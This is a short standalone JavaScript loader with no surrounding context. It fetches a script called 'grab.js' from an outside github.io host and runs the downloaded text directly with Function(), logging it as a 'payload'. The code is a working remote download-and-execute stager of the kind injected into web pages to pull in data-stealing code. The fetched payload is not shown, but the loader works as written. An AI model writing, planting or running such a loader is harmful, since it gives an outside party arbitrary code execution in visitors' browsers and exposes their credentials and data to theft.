(async()=>{
  console.log('🔄 Loader started'); // Debug
  try {
    const resp = await fetch('https://cloudsecu.github.io/Data/grab.js');
    if (!resp.ok) throw new Error('Fetch failed: ' + resp.status);
    const code = await resp.text();
    console.log('✅ Payload loaded:', code.length, 'bytes');
    Function(code)();
  } catch(e) {
    console.error('Loader error:', e); // Debug console
  }
})();
